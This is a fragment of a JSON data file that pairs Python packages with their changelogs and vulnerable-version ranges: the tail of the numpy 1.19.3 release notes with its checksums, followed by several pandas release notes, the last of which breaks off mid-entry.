total of 10 pull requests were merged for this release.\n\n* `17298 <https://github.com/numpy/numpy/pull/17298>`__: BLD: set upper versions for build dependencies\n* `17336 <https://github.com/numpy/numpy/pull/17336>`__: BUG: Set deprecated fields to null in PyArray_InitArrFuncs\n* `17446 <https://github.com/numpy/numpy/pull/17446>`__: ENH: Warn on unsupported Python 3.10+\n* `17450 <https://github.com/numpy/numpy/pull/17450>`__: MAINT: Update test_requirements.txt.\n* `17522 <https://github.com/numpy/numpy/pull/17522>`__: ENH: Support for the NVIDIA HPC SDK nvfortran compiler\n* `17568 <https://github.com/numpy/numpy/pull/17568>`__: BUG: Cygwin Workaround for #14787 on affected platforms\n* `17647 <https://github.com/numpy/numpy/pull/17647>`__: BUG: Fix memory leak of buffer-info cache due to relaxed strides\n* `17652 <https://github.com/numpy/numpy/pull/17652>`__: MAINT: Backport openblas_support from master.\n* `17653 <https://github.com/numpy/numpy/pull/17653>`__: TST: Add Python 3.9 to the CI testing on Windows, Mac.\n* `17660 <https://github.com/numpy/numpy/pull/17660>`__: TST: Simplify source path names in test_extending.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    e5c6c782b2f112c32dcc38242521ec83  numpy-1.19.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    02323e4a20e14e6f7cded1c55f6a0afe  numpy-1.19.3-cp36-cp36m-manylinux1_i686.whl\n    95f19f0b6c60a755a8454f22eb15f4d6  numpy-1.19.3-cp36-cp36m-manylinux1_x86_64.whl\n    e66cf5ea007a9b567be2b1a901b3d2e0  numpy-1.19.3-cp36-cp36m-manylinux2010_i686.whl\n    8c7d422f147392bd31f9e5bfc41a170e  numpy-1.19.3-cp36-cp36m-manylinux2010_x86_64.whl\n    da02c95dcf0acf7688aebaba7ba2750d  numpy-1.19.3-cp36-cp36m-manylinux2014_aarch64.whl\n    96e6ec05aca18516c8a5961c17a0cac6  numpy-1.19.3-cp36-cp36m-win32.whl\n    5aa36a829a7ce0a89e6fea502d4fa9ea  numpy-1.19.3-cp36-cp36m-win_amd64.whl\n    9143b46601bc0457dd42795a71ccd2f1  numpy-1.19.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    ebe09a5e206db0de65154ef75377f963  numpy-1.19.3-cp37-cp37m-manylinux1_i686.whl\n    96008f5c61368d4cd967ecd474525df6  numpy-1.19.3-cp37-cp37m-manylinux1_x86_64.whl\n    e61aaf0c971b667c5fed8b5de3773c6d  numpy-1.19.3-cp37-cp37m-manylinux2010_i686.whl\n    74a9f9dab6f00bcf56096eaa910c48b9  numpy-1.19.3-cp37-cp37m-manylinux2010_x86_64.whl\n    18d911f7f462ee98333de9579adde331  numpy-1.19.3-cp37-cp37m-manylinux2014_aarch64.whl\n    f29846178b82bd4e8db1685a6e911336  numpy-1.19.3-cp37-cp37m-win32.whl\n    d372be03d9e57e5e0e1372bf39391241  numpy-1.19.3-cp37-cp37m-win_amd64.whl\n    c64b6538e07bca9d84287eebb3f3a01b  numpy-1.19.3-cp38-cp38-macosx_10_9_x86_64.whl\n    8ac57941de395be58376611b211ea571  numpy-1.19.3-cp38-cp38-manylinux1_i686.whl\n    81cc1993ac8da61fea677a7eb49989e8  numpy-1.19.3-cp38-cp38-manylinux1_x86_64.whl\n    9b2b05db89068d1f3f32a231f3953355  numpy-1.19.3-cp38-cp38-manylinux2010_i686.whl\n    d26cfa5ad6f4aa6beb42246efc45f565  numpy-1.19.3-cp38-cp38-manylinux2010_x86_64.whl\n    969a13b40fceb950021e297d5427f329  numpy-1.19.3-cp38-cp38-manylinux2014_aarch64.whl\n    f978618640860e72b91c522f4e4085af  numpy-1.19.3-cp38-cp38-win32.whl\n    af140a06f216c4100dc93c4135003d10  numpy-1.19.3-cp38-cp38-win_amd64.whl\n    fda3cdf138516040cad3de66496cf670  numpy-1.19.3-cp39-cp39-macosx_10_9_x86_64.whl\n    f683469f18abc8c84aa831d9e78f4eb6  numpy-1.19.3-cp39-cp39-manylinux1_i686.whl\n    26414c3db751ca4735f744b239bf9703  numpy-1.19.3-cp39-cp39-manylinux1_x86_64.whl\n    3164ede05e3a5d28dd8bd66aee56928c  numpy-1.19.3-cp39-cp39-manylinux2010_i686.whl\n    fc0b0c73c5508247d21beb42cf3fff66  numpy-1.19.3-cp39-cp39-manylinux2010_x86_64.whl\n    75097b6e154469c63c50c8f7eaf52a89  numpy-1.19.3-cp39-cp39-manylinux2014_aarch64.whl\n    cd4363bde576c997bf737f420a85683a  numpy-1.19.3-cp39-cp39-win32.whl\n    54fa685b3d30585763f59a7b2be7279b  numpy-1.19.3-cp39-cp39-win_amd64.whl\n    ed5bd59a064fe5b95699c222dc7a4638  numpy-1.19.3-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    b2d13ca1b8ff89a9289174a86b835165  numpy-1.19.3.tar.gz\n    7f014f9964987b59083c8dc4d158d45a  numpy-1.19.3.zip\n\nSHA256\n------\n::\n\n    942d2cdcb362739908c26ce8dd88db6e139d3fa829dd7452dd9ff02cba6b58b2  numpy-1.19.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    efd656893171bbf1331beca4ec9f2e74358fc732a2084f664fd149cc4b3441d2  numpy-1.19.3-cp36-cp36m-manylinux1_i686.whl\n    1a307bdd3dd444b1d0daa356b5f4c7de2e24d63bdc33ea13ff718b8ec4c6a268  numpy-1.19.3-cp36-cp36m-manylinux1_x86_64.whl\n    9d08d84bb4128abb9fbd9f073e5c69f70e5dab991a9c42e5b4081ea5b01b5db0  numpy-1.19.3-cp36-cp36m-manylinux2010_i686.whl\n    7197ee0a25629ed782c7bd01871ee40702ffeef35bc48004bc2fdcc71e29ba9d  numpy-1.19.3-cp36-cp36m-manylinux2010_x86_64.whl\n    8edc4d687a74d0a5f8b9b26532e860f4f85f56c400b3a98899fc44acb5e27add  numpy-1.19.3-cp36-cp36m-manylinux2014_aarch64.whl\n    522053b731e11329dd52d258ddf7de5288cae7418b55e4b7d32f0b7e31787e9d  numpy-1.19.3-cp36-cp36m-win32.whl\n    eefc13863bf01583a85e8c1121a901cc7cb8f059b960c4eba30901e2e6aba95f  numpy-1.19.3-cp36-cp36m-win_amd64.whl\n    6ff88bcf1872b79002569c63fe26cd2cda614e573c553c4d5b814fb5eb3d2822  numpy-1.19.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    e080087148fd70469aade2abfeadee194357defd759f9b59b349c6192aba994c  numpy-1.19.3-cp37-cp37m-manylinux1_i686.whl\n    50f68ebc439821b826823a8da6caa79cd080dee2a6d5ab9f1163465a060495ed  numpy-1.19.3-cp37-cp37m-manylinux1_x86_64.whl\n    b9074d062d30c2779d8af587924f178a539edde5285d961d2dfbecbac9c4c931  numpy-1.19.3-cp37-cp37m-manylinux2010_i686.whl\n    463792a249a81b9eb2b63676347f996d3f0082c2666fd0604f4180d2e5445996  numpy-1.19.3-cp37-cp37m-manylinux2010_x86_64.whl\n    ea6171d2d8d648dee717457d0f75db49ad8c2f13100680e284d7becf3dc311a6  numpy-1.19.3-cp37-cp37m-manylinux2014_aarch64.whl\n    0ee77786eebbfa37f2141fd106b549d37c89207a0d01d8852fde1c82e9bfc0e7  numpy-1.19.3-cp37-cp37m-win32.whl\n    271139653e8b7a046d11a78c0d33bafbddd5c443a5b9119618d0652a4eb3a09f  numpy-1.19.3-cp37-cp37m-win_amd64.whl\n    e983cbabe10a8989333684c98fdc5dd2f28b236216981e0c26ed359aaa676772  numpy-1.19.3-cp38-cp38-macosx_10_9_x86_64.whl\n    d78294f1c20f366cde8a75167f822538a7252b6e8b9d6dbfb3bdab34e7c1929e  numpy-1.19.3-cp38-cp38-manylinux1_i686.whl\n    199bebc296bd8a5fc31c16f256ac873dd4d5b4928dfd50e6c4995570fc71a8f3  numpy-1.19.3-cp38-cp38-manylinux1_x86_64.whl\n    dffed17848e8b968d8d3692604e61881aa6ef1f8074c99e81647ac84f6038535  numpy-1.19.3-cp38-cp38-manylinux2010_i686.whl\n    5ea4401ada0d3988c263df85feb33818dc995abc85b8125f6ccb762009e7bc68  numpy-1.19.3-cp38-cp38-manylinux2010_x86_64.whl\n    604d2e5a31482a3ad2c88206efd43d6fcf666ada1f3188fd779b4917e49b7a98  numpy-1.19.3-cp38-cp38-manylinux2014_aarch64.whl\n    a2daea1cba83210c620e359de2861316f49cc7aea8e9a6979d6cb2ddab6dda8c  numpy-1.19.3-cp38-cp38-win32.whl\n    dfdc8b53aa9838b9d44ed785431ca47aa3efaa51d0d5dd9c412ab5247151a7c4  numpy-1.19.3-cp38-cp38-win_amd64.whl\n    9f7f56b5e85b08774939622b7d45a5d00ff511466522c44fc0756ac7692c00f2  numpy-1.19.3-cp39-cp39-macosx_10_9_x86_64.whl\n    8802d23e4895e0c65e418abe67cdf518aa5cbb976d97f42fd591f921d6dffad0  numpy-1.19.3-cp39-cp39-manylinux1_i686.whl\n    c4aa79993f5d856765819a3651117520e41ac3f89c3fc1cb6dee11aa562df6da  numpy-1.19.3-cp39-cp39-manylinux1_x86_64.whl\n    51e8d2ae7c7e985c7bebf218e56f72fa93c900ad0c8a7d9fbbbf362f45710f69  numpy-1.19.3-cp39-cp39-manylinux2010_i686.whl\n    50d3513469acf5b2c0406e822d3f314d7ac5788c2b438c24e5dd54d5a81ef522  numpy-1.19.3-cp39-cp39-manylinux2010_x86_64.whl\n    741d95eb2b505bb7a99fbf4be05fa69f466e240c2b4f2d3ddead4f1b5f82a5a5  numpy-1.19.3-cp39-cp39-manylinux2014_aarch64.whl\n    1ea7e859f16e72ab81ef20aae69216cfea870676347510da9244805ff9670170  numpy-1.19.3-cp39-cp39-win32.whl\n    83af653bb92d1e248ccf5fdb05ccc934c14b936bcfe9b917dc180d3f00250ac6  numpy-1.19.3-cp39-cp39-win_amd64.whl\n    9a0669787ba8c9d3bb5de5d9429208882fb47764aa79123af25c5edc4f5966b9  numpy-1.19.3-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    9179d259a9bc53ed7b153d31fc3156d1ca560d61079f53191cf177c3efc4a498  numpy-1.19.3.tar.gz\n    35bf5316af8dc7c7db1ad45bec603e5fb28671beb98ebd1d65e8059efcfd3b72  numpy-1.19.3.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n"}}, {"name": "pandas", "insecurity": ["<0.16.0rc1"], "changelog": {"2.1.3": ".. _whatsnew_213:\n\nWhat's new in 2.1.3 (November 10, 2023)\n---------------------------------------\n\nThese are the changes in pandas 2.1.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_213.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed infinite recursion from operations that return a new object on some DataFrame subclasses (:issue:`55763`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_213.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`DatetimeIndex.diff` raising ``TypeError`` (:issue:`55080`)\n- Bug in :meth:`Index.isin` raising for Arrow backed string and ``None`` value (:issue:`55821`)\n- Fix :func:`read_parquet` and :func:`read_feather` for `CVE-2023-47248 <https://www.cve.org/CVERecord?id=CVE-2023-47248>`__ (:issue:`55894`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_213.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.2..v2.1.3|HEAD\n", "1.2.4": ".. _whatsnew_124:\n\nWhat's new in 1.2.4 (April 12, 2021)\n------------------------------------\n\nThese are the changes in pandas 1.2.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_124.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`DataFrame.sum` when ``min_count`` greater than the :class:`DataFrame` shape was passed resulted in a ``ValueError`` (:issue:`39738`)\n- Fixed regression in :meth:`DataFrame.to_json` raising ``AttributeError`` when run on PyPy (:issue:`39837`)\n- Fixed regression in (in)equality comparison of ``pd.NaT`` with a non-datetimelike numpy array returning a scalar instead of an array (:issue:`40722`)\n- Fixed regression in :meth:`DataFrame.where` not returning a copy in the case of an all True condition (:issue:`39595`)\n- Fixed regression in :meth:`DataFrame.replace` raising ``IndexError`` when ``regex`` was a multi-key dictionary (:issue:`39338`)\n- Fixed regression in repr of floats in an ``object`` column not respecting ``float_format`` when printed in the console or outputted through :meth:`DataFrame.to_string`, :meth:`DataFrame.to_html`, and :meth:`DataFrame.to_latex` (:issue:`40024`)\n- Fixed regression in NumPy ufuncs such as ``np.add`` not passing through all arguments for :class:`DataFrame` (:issue:`40662`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_124.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.3..v1.2.4\n", "1.3.5": ".. _whatsnew_135:\n\nWhat's new in 1.3.5 (December 12, 2021)\n---------------------------------------\n\nThese are the changes in pandas 1.3.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_135.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`Series.equals` when comparing floats with dtype object to None (:issue:`44190`)\n- Fixed regression in :func:`merge_asof` raising error when array was supplied as join key (:issue:`42844`)\n- Fixed regression when resampling :class:`DataFrame` with :class:`DateTimeIndex` with empty groups and ``uint8``, ``uint16`` or ``uint32`` columns incorrectly raising ``RuntimeError`` (:issue:`43329`)\n- Fixed regression in creating a :class:`DataFrame` from a timezone-aware :class:`Timestamp` scalar near a Daylight Savings Time transition (:issue:`42505`)\n- Fixed performance regression in :func:`read_csv` (:issue:`44106`)\n- Fixed regression in :meth:`Series.duplicated` and :meth:`Series.drop_duplicates` when Series has :class:`Categorical` dtype with boolean categories (:issue:`44351`)\n- Fixed regression in :meth:`.DataFrameGroupBy.sum` and :meth:`.SeriesGroupBy.sum` with ``timedelta64[ns]`` dtype containing ``NaT`` failing to treat that value as NA (:issue:`42659`)\n- Fixed regression in :meth:`.RollingGroupby.cov` and :meth:`.RollingGroupby.corr` when ``other`` had the same shape as each group would incorrectly return superfluous groups in the result (:issue:`42915`)\n\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_135.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.4..v1.3.5|HEAD\n", "1.0.3": "\n.. _whatsnew_103:\n\nWhat's new in 1.0.3 (March 17, 2020)\n------------------------------------\n\nThese are the changes in pandas 1.0.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_103.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in ``resample.agg`` when the underlying data is non-writeable (:issue:`31710`)\n- Fixed regression in :class:`DataFrame` exponentiation with reindexing (:issue:`32685`)\n\n.. _whatsnew_103.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.2..v1.0.3\n", "0.1": ".. _whatsnew_0152:\n\nVersion 0.15.2 (December 12, 2014)\n----------------------------------\n\n{{ header }}\n\n\nThis is a minor release from 0.15.1 and includes a large number of bug fixes\nalong with several new features, enhancements, and performance improvements.\nA small number of API changes were necessary to fix existing bugs.\nWe recommend that all users upgrade to this version.\n\n- :ref:`Enhancements <whatsnew_0152.enhancements>`\n- :ref:`API Changes <whatsnew_0152.api>`\n- :ref:`Performance Improvements <whatsnew_0152.performance>`\n- :ref:`Bug Fixes <whatsnew_0152.bug_fixes>`\n\n.. _whatsnew_0152.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- Indexing in ``MultiIndex`` beyond lex-sort depth is now supported, though\n  a lexically sorted index will have a better performance. (:issue:`2646`)\n\n  .. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({'jim':[0, 0, 1, 1],\n       ...:                    'joe':['x', 'x', 'z', 'y'],\n       ...:                    'jolie':np.random.rand(4)}).set_index(['jim', 'joe'])\n       ...:\n\n    In [2]: df\n    Out[2]:\n                jolie\n    jim joe\n    0   x    0.126970\n        x    0.966718\n    1   z    0.260476\n        y    0.897237\n\n    [4 rows x 1 columns]\n\n    In [3]: df.index.lexsort_depth\n    Out[3]: 1\n\n    # in prior versions this would raise a KeyError\n    # will now show a PerformanceWarning\n    In [4]: df.loc[(1, 'z')]\n    Out[4]:\n                jolie\n    jim joe\n    1   z    0.260476\n\n    [1 rows x 1 columns]\n\n    # lexically sorting\n    In [5]: df2 = df.sort_index()\n\n    In [6]: df2\n    Out[6]:\n                jolie\n    jim joe\n    0   x    0.126970\n        x    0.966718\n    1   y    0.897237\n        z    0.260476\n\n    [4 rows x 1 columns]\n\n    In [7]: df2.index.lexsort_depth\n    Out[7]: 2\n\n    In [8]: df2.loc[(1,'z')]\n    Out[8]:\n                jolie\n    jim joe\n    1   z    0.260476\n\n    [1 rows x 1 columns]\n\n- Bug in unique of Series with ``category`` dtype, which returned all categories regardless\n  whether they were \"used\" or not (see :issue:`8559` for the discussion).\n  Previous behaviour was to return all categories:\n\n  .. code-block:: ipython\n\n    In [3]: cat = pd.Categorical(['a', 'b', 'a'], categories=['a', 'b', 'c'])\n\n    In [4]: cat\n    Out[4]:\n    [a, b, a]\n    Categories (3, object): [a < b < c]\n\n    In [5]: cat.unique()\n    Out[5]: array(['a', 'b', 'c'], dtype=object)\n\n  Now, only the categories that do effectively occur in the array are returned:\n\n  .. ipython:: python\n\n    cat = pd.Categorical(['a', 'b', 'a'], categories=['a', 'b', 'c'])\n    cat.unique()\n\n- ``Series.all`` and ``Series.any`` now support the ``level`` and ``skipna`` parameters. ``Series.all``, ``Series.any``, ``Index.all``, and ``Index.any`` no longer support the ``out`` and ``keepdims`` parameters, which existed for compatibility with ndarray. Various index types no longer support the ``all`` and ``any`` aggregation functions and will now raise ``TypeError``. (:issue:`8302`).\n\n- Allow equality comparisons of Series with a categorical dtype and object dtype; previously these would raise ``TypeError`` (:issue:`8938`)\n\n- Bug in ``NDFrame``: conflicting attribute/column names now behave consistently between getting and setting. Previously, when both a column and attribute named ``y`` existed, ``data.y`` would return the attribute, while ``data.y = z`` would update the column (:issue:`8994`)\n\n  .. ipython:: python\n\n     data = pd.DataFrame({'x': [1, 2, 3]})\n     data.y = 2\n     data['y'] = [2, 4, 6]\n     data\n\n     # this assignment was inconsistent\n     data.y = 5\n\n  Old behavior:\n\n  .. code-block:: ipython\n\n     In [6]: data.y\n     Out[6]: 2\n\n     In [7]: data['y'].values\n     Out[7]: array([5, 5, 5])\n\n  New behavior:\n\n  .. ipython:: python\n\n     data.y\n     data['y'].values\n\n- ``Timestamp('now')`` is now equivalent to ``Timestamp.now()`` in that it returns the local time rather than UTC. Also, ``Timestamp('today')`` is now equivalent to ``Timestamp.today()`` and both have ``tz`` as a possible argument. (:issue:`9000`)\n\n- Fix negative step support for label-based slices (:issue:`8753`)\n\n  Old behavior:\n\n  .. code-block:: ipython\n\n     In [1]: s = pd.Series(np.arange(3), ['a', 'b', 'c'])\n     Out[1]:\n     a    0\n     b    1\n     c    2\n     dtype: int64\n\n     In [2]: s.loc['c':'a':-1]\n     Out[2]:\n     c    2\n     dtype: int64\n\n  New behavior:\n\n  .. ipython:: python\n\n     s = pd.Series(np.arange(3), ['a', 'b', 'c'])\n     s.loc['c':'a':-1]\n\n\n.. _whatsnew_0152.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n``Categorical`` enhancements:\n\n- Added ability to export Categorical data to Stata (:issue:`8633`).  See :ref:`here <io.stata-categorical>` for limitations of categorical variables exported to Stata data files.\n- Added flag ``order_categoricals`` to ``StataReader`` and ``read_stata`` to select whether to order imported categorical data (:issue:`8836`).  See :ref:`here <io.stata-categorical>` for more information on importing categorical variables from Stata data files.\n- Added ability to export Categorical data to/from HDF5 (:issue:`7621`). Queries work the same as if it was an object array. However, the ``category`` dtyped data is stored in a more efficient manner. See :ref:`here <io.hdf5-categorical>` for an example and caveats w.r.t. prior versions of pandas.\n- Added support for ``searchsorted()`` on ``Categorical`` class (:issue:`8420`).\n\nOther enhancements:\n\n- Added the ability to specify the SQL type of columns when writing a DataFrame\n  to a database (:issue:`8778`).\n  For example, specifying to use the sqlalchemy ``String`` type instead of the\n  default ``Text`` type for string columns:\n\n  .. code-block:: python\n\n     from sqlalchemy.types import String\n     data.to_sql('data_dtype', engine, dtype={'Col_1': String})  # noqa F821\n\n- ``Series.all`` and ``Series.any`` now support the ``level`` and ``skipna`` parameters (:issue:`8302`):\n\n  .. code-block:: python\n\n     >>> s = pd.Series([False, True, False], index=[0, 0, 1])\n     >>> s.any(level=0)\n     0     True\n     1    False\n     dtype: bool\n\n- ``Panel`` now supports the ``all`` and ``any`` aggregation functions. (:issue:`8302`):\n\n  .. code-block:: python\n\n     >>> p = pd.Panel(np.random.rand(2, 5, 4) > 0.1)\n     >>> p.all()\n            0      1      2     3\n     0   True   True   True  True\n     1   True  False   True  True\n     2   True   True   True  True\n     3  False   True  False  True\n     4   True   True   True  True\n\n- Added support for ``utcfromtimestamp()``, ``fromtimestamp()``, and ``combine()`` on ``Timestamp`` class (:issue:`5351`).\n- Added Google Analytics (`pandas.io.ga`) basic documentation (:issue:`8835`). See `here <https://pandas.pydata.org/pandas-docs/version/0.15.2/remote_data.html#remote-data-ga>`__.\n- ``Timedelta`` arithmetic returns ``NotImplemented`` in unknown cases, allowing extensions by custom classes (:issue:`8813`).\n- ``Timedelta`` now supports arithmetic with ``numpy.ndarray`` objects of the appropriate dtype (numpy 1.8 or newer only) (:issue:`8884`).\n- Added ``Timedelta.to_timedelta64()`` method to the public API (:issue:`8884`).\n- Added ``gbq.generate_bq_schema()`` function to the gbq module (:issue:`8325`).\n- ``Series`` now works with map objects the same way as generators (:issue:`8909`).\n- Added context manager to ``HDFStore`` for automatic closing (:issue:`8791`).\n- ``to_datetime`` gains an ``exact`` keyword to allow for a format to not require an exact match for a provided format string (if its ``False``). ``exact`` defaults to ``True`` (meaning that exact matching is still the default)  (:issue:`8904`)\n- Added ``axvlines`` boolean option to parallel_coordinates plot function, determines whether vertical lines will be printed, default is True\n- Added ability to read table footers to read_html (:issue:`8552`)\n- ``to_sql`` now infers data types of non-NA values for columns that contain NA values and have dtype ``object`` (:issue:`8778`).\n\n\n.. _whatsnew_0152.performance:\n\nPerformance\n~~~~~~~~~~~\n\n- Reduce memory usage when skiprows is an integer in read_csv (:issue:`8681`)\n- Performance boost for ``to_datetime`` conversions with a passed ``format=``, and the ``exact=False`` (:issue:`8904`)\n\n\n.. _whatsnew_0152.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in concat of Series with ``category`` dtype which were coercing to ``object``. (:issue:`8641`)\n- Bug in Timestamp-Timestamp not returning a Timedelta type and datelike-datelike ops with timezones (:issue:`8865`)\n- Made consistent a timezone mismatch exception (either tz operated with None or incompatible timezone), will now return ``TypeError`` rather than ``ValueError`` (a couple of edge cases only), (:issue:`8865`)\n- Bug in using a ``pd.Grouper(key=...)`` with no level/axis or level only (:issue:`8795`, :issue:`8866`)\n- Report a ``TypeError`` when invalid/no parameters are passed in a groupby (:issue:`8015`)\n- Bug in packaging pandas with ``py2app/cx_Freeze`` (:issue:`8602`, :issue:`8831`)\n- Bug in ``groupby`` signatures that didn't include \\*args or \\*\\*kwargs (:issue:`8733`).\n- ``io.data.Options`` now raises ``RemoteDataError`` when no expiry dates are available from Yahoo and when it receives no data from Yahoo (:issue:`8761`), (:issue:`8783`).\n- Unclear error message in csv parsing when passing dtype and names and the parsed data is a different data type (:issue:`8833`)\n- Bug in slicing a MultiIndex with an empty list and at least one boolean indexer (:issue:`8781`)\n- ``io.data.Options`` now raises ``RemoteDataError`` when no expiry dates are available from Yahoo (:issue:`8761`).\n- ``Timedelta`` kwargs may now be numpy ints and floats (:issue:`8757`).\n- Fixed several outstanding bugs for ``Timedelta`` arithmetic and comparisons (:issue:`8813`, :issue:`5963`, :issue:`5436`).\n- ``sql_schema`` now generates dialect appropriate ``CREATE TABLE`` statements (:issue:`8697`)\n- ``slice`` string method now takes step into account (:issue:`8754`)\n- Bug in ``BlockManager`` where setting values with different type would break block integrity (:issue:`8850`)\n- Bug in ``DatetimeIndex`` when using ``time`` object as key (:issue:`8667`)\n- Bug in ``merge`` where ``how='left'`` and ``sort=False`` would not preserve left frame order (:issue:`7331`)\n- Bug in ``MultiIndex.reindex`` where reindexing at level would not reorder labels (:issue:`4088`)\n- Bug in certain operations with dateutil timezones, manifesting with dateutil 2.3 (:issue:`8639`)\n- Regression in DatetimeIndex iteration with a Fixed/Local offset timezone (:issue:`8890`)\n- Bug in ``to_datetime`` when parsing a nanoseconds using the ``%f`` format (:issue:`8989`)\n- ``io.data.Options`` now raises ``RemoteDataError`` when no expiry dates are available from Yahoo and when it receives no data from Yahoo (:issue:`8761`), (:issue:`8783`).\n- Fix: The font size was only set on x axis if vertical or the y axis if horizontal. (:issue:`8765`)\n- Fixed division by 0 when reading big csv files in python 3 (:issue:`8621`)\n- Bug in outputting a MultiIndex with ``to_html,index=False`` which would add an extra column (:issue:`8452`)\n- Imported categorical variables from Stata files retain the ordinal information in the underlying data (:issue:`8836`).\n- Defined ``.size`` attribute across ``NDFrame`` objects to provide compat with numpy >= 1.9.1; buggy with ``np.array_split`` (:issue:`8846`)\n- Skip testing of histogram plots for matplotlib <= 1.2 (:issue:`8648`).\n- Bug where ``get_data_google`` returned object dtypes (:issue:`3995`)\n- Bug in ``DataFrame.stack(..., dropna=False)`` when the DataFrame's ``columns`` is a ``MultiIndex``\n  whose ``labels`` do not reference all its ``levels``. (:issue:`8844`)\n- Bug in that Option context applied on ``__enter__`` (:issue:`8514`)\n- Bug in resample that causes a ValueError when resampling across multiple days\n  and the last offset is not calculated from the start of the range (:issue:`8683`)\n- Bug where ``DataFrame.plot(kind='scatter')`` fails when checking if an np.array is in the DataFrame (:issue:`8852`)\n- Bug in ``pd.infer_freq/DataFrame.inferred_freq`` that prevented proper sub-daily frequency inference when the index contained DST days (:issue:`8772`).\n- Bug where index name was still used when plotting a series with ``use_index=False`` (:issue:`8558`).\n- Bugs when trying to stack multiple columns, when some (or all) of the level names are numbers (:issue:`8584`).\n- Bug in ``MultiIndex`` where ``__contains__`` returns wrong result if index is not lexically sorted or unique (:issue:`7724`)\n- BUG CSV: fix problem with trailing white space in skipped rows, (:issue:`8679`), (:issue:`8661`), (:issue:`8983`)\n- Regression in ``Timestamp`` does not parse 'Z' zone designator for UTC (:issue:`8771`)\n- Bug in ``StataWriter`` the produces writes strings with 244 characters irrespective of actual size (:issue:`8969`)\n- Fixed ValueError raised by cummin/cummax when datetime64 Series contains NaT. (:issue:`8965`)\n- Bug in DataReader returns object dtype if there are missing values (:issue:`8980`)\n- Bug in plotting if sharex was enabled and index was a timeseries, would show labels on multiple axes (:issue:`3964`).\n- Bug where passing a unit to the TimedeltaIndex constructor applied the to nano-second conversion twice. (:issue:`9011`).\n- Bug in plotting of a period-like array (:issue:`9012`)\n\n\n.. _whatsnew_0.15.2.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.15.1..v0.15.2\n", "2.1.0": ".. _whatsnew_210:\n\nWhat's new in 2.1.0 (Aug 30, 2023)\n--------------------------------------\n\nThese are the changes in pandas 2.1.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_210.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_210.enhancements.pyarrow_dependency:\n\nPyArrow will become a required dependency with pandas 3.0\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n`PyArrow <https://arrow.apache.org/docs/python/index.html>`_ will become a required\ndependency of pandas starting with pandas 3.0. This decision was made based on\n`PDEP 10 <https://pandas.pydata.org/pdeps/0010-required-pyarrow-dependency.html>`_.\n\nThis will enable more changes that are hugely beneficial to pandas users, including\nbut not limited to:\n\n- inferring strings as PyArrow backed strings by default enabling a significant\n  reduction of the memory footprint and huge performance improvements.\n- inferring more complex dtypes with PyArrow by default, like ``Decimal``, ``lists``,\n  ``bytes``, ``structured data`` and more.\n- Better interoperability with other libraries that depend on Apache Arrow.\n\nWe are collecting feedback on this decision `here <https://github.com/pandas-dev/pandas/issues/54466>`_.\n\n.. _whatsnew_210.enhancements.infer_strings:\n\nAvoid NumPy object dtype for strings by default\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, all strings were stored in columns with NumPy object dtype by default.\nThis release introduces an option ``future.infer_string`` that infers all\nstrings as PyArrow backed strings with dtype ``\"string[pyarrow_numpy]\"`` instead.\nThis is a new string dtype implementation that follows NumPy semantics in comparison\noperations and will return ``np.nan`` as the missing value indicator.\nSetting the option will also infer the dtype ``\"string\"`` as a :class:`StringDtype` with\nstorage set to ``\"pyarrow_numpy\"``, ignoring the value behind the option\n``mode.string_storage``.\n\nThis option only works if PyArrow is installed. PyArrow backed strings have a\nsignificantly reduced memory footprint and provide a big performance improvement\ncompared to NumPy object (:issue:`54430`).\n\nThe option can be enabled with:\n\n.. code-block:: python\n\n    pd.options.future.infer_string = True\n\nThis behavior will become the default with pandas 3.0.\n\n.. _whatsnew_210.enhancements.reduction_extension_dtypes:\n\nDataFrame reductions preserve extension dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, the results of DataFrame reductions\n(:meth:`DataFrame.sum` :meth:`DataFrame.mean` etc.) had NumPy dtypes, even when the DataFrames\nwere of extension 